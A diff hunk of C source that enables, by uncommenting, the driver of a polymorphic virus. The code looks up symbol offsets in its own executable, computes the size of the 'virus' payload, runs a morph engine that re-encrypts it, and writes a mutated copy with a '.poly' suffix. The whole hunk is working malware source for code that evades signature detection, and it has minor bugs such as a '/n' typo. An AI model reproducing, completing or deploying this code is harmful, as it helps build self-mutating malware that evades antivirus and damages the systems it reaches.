@@ -74,99 +74,99 @@ int polymorphic(int argc, char* argv[])
       }
 
 
-      // char main[]="main";
-      // char start[]="_start";
-      // char decryption[]="decrypt.decryption_function";
+      char main[]="main";
+      char start[]="_start";
+      char decryption[]="decrypt.decryption_function";
       
-      // write(1, getaddress(argv[0], main), strlen(getaddress(argv[0], main)));
-      // printf("\n");
-      // write(1, getaddress(argv[0], start), strlen(getaddress(argv[0], start)));
-      // printf("\n");
-      // write(1, getaddress(argv[0], decryption), strlen(getaddress(argv[0], decryption)));
-      // printf("\n");
+      write(1, getaddress(argv[0], main), strlen(getaddress(argv[0], main)));
+      printf("\n");
+      write(1, getaddress(argv[0], start), strlen(getaddress(argv[0], start)));
+      printf("\n");
+      write(1, getaddress(argv[0], decryption), strlen(getaddress(argv[0], decryption)));
+      printf("\n");
 
-	// // // to get offset just delete the most significant char
+	// // to get offset just delete the most significant char
 
-      // char *main_offset = getaddress(argv[0], "main") + 1;
-      // char *start_offset = getaddress(argv[0], "_start") + 1;
-      // char *decryption_offset = getaddress(argv[0], "decrypt.decryption_function") + 1;
+      char *main_offset = getaddress(argv[0], "main") + 1;
+      char *start_offset = getaddress(argv[0], "_start") + 1;
+      char *decryption_offset = getaddress(argv[0], "decrypt.decryption_function") + 1;
 
-      // // write(1, main_offset, strlen(main_offset));
+      // write(1, main_offset, strlen(main_offset));
 
-      // const size_t virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
-	// size_t virus_encrypt_size    = strtoull(start_offset, NULL, 16);
+      const size_t virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
+	size_t virus_encrypt_size    = strtoull(start_offset, NULL, 16);
       
-      // // calculate the payload size
-      // virus_encrypt_size = virus_encrypt_size - virus_instruction_begin;
+      // calculate the payload size
+      virus_encrypt_size = virus_encrypt_size - virus_instruction_begin;
 
-	// const size_t virus_decrypt_offset  = strtoull(decryption_offset, NULL, 16);
+	const size_t virus_decrypt_offset  = strtoull(decryption_offset, NULL, 16);
 
-      // printf("%ul\n", virus_instruction_begin);
-      // printf("%ul\n", virus_encrypt_size);
-      // printf("%ul\n", virus_decrypt_offset);
+      printf("%ul\n", virus_instruction_begin);
+      printf("%ul\n", virus_encrypt_size);
+      printf("%ul\n", virus_decrypt_offset);
 
-      // // open the executable file
-	// FILE* exe_file = fopen(argv[0], "rb");
-	// if(!exe_file)
-	// {
-	// 	printf("Failed to open %s\n", argv[0]);
-	// 	return -1;
-	// }
+      // open the executable file
+	FILE* exe_file = fopen(argv[0], "rb");
+	if(!exe_file)
+	{
+		printf("Failed to open %s\n", argv[0]);
+		return -1;
+	}
 
-	// // get the size of the executable file
-	// size_t exe_size;
-	// fseek(exe_file, 0, SEEK_END);
-	// exe_size = ftell(exe_file);
-	// rewind(exe_file);
+	// get the size of the executable file
+	size_t exe_size;
+	fseek(exe_file, 0, SEEK_END);
+	exe_size = ftell(exe_file);
+	rewind(exe_file);
 
-	// // allocate the data
-	// char* exe_data = malloc(exe_size);
-	// if(!exe_data)
-	// {
-	// 	fclose(exe_file);
-	// 	printf("Executable data allocation failed\n");
-	// 	return 1;
-	// }
+	// allocate the data
+	char* exe_data = malloc(exe_size);
+	if(!exe_data)
+	{
+		fclose(exe_file);
+		printf("Executable data allocation failed\n");
+		return 1;
+	}
 
-	// // read the entire executable file
-	// if(!fread(exe_data, exe_size, 1, exe_file))
-	// {
-	// 	fclose(exe_file);
-	// 	printf("Executable file read failed\n");
-	// }
+	// read the entire executable file
+	if(!fread(exe_data, exe_size, 1, exe_file))
+	{
+		fclose(exe_file);
+		printf("Executable file read failed\n");
+	}
 
-	// // close the file
-	// fclose(exe_file);
+	// close the file
+	fclose(exe_file);
 
 
 
-	// // call the polymorphic engine
-	// if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
-	// {
-	// 	printf("An error occured in the polymorphic engine\n");
+	// call the polymorphic engine
+	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
+	{
+		printf("An error occured in the polymorphic engine\n");
 
-	// }
+	}
 
-	// // initialize the output filename
-	// char out_filename[FILENAME_MAX];
-	// snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
-      // printf("/n");
-	// // open the output file
-	// FILE* out_file = fopen(out_filename, "wb");
-	// if(!out_file)
-	// {
-	// 	printf("failed to open %s\n", out_filename);
-	// 	// goto quit;
-	// }
+	// initialize the output filename
+	char out_filename[FILENAME_MAX];
+	snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
+      printf("/n");
+	// open the output file
+	FILE* out_file = fopen(out_filename, "wb");
+	if(!out_file)
+	{
+		printf("failed to open %s\n", out_filename);
+		// goto quit;
+	}
 
-	// // write the modified executable data
-	// if(!fwrite(exe_data, exe_size, 1, out_file))
-	// {
-	// 	printf("failed to write into %s\n", out_filename);
-	// }
+	// write the modified executable data
+	if(!fwrite(exe_data, exe_size, 1, out_file))
+	{
+		printf("failed to write into %s\n", out_filename);
+	}
 
-      // quit:
-      //       free(exe_data);
+      quit:
+            free(exe_data);
       return 0;
 
 }
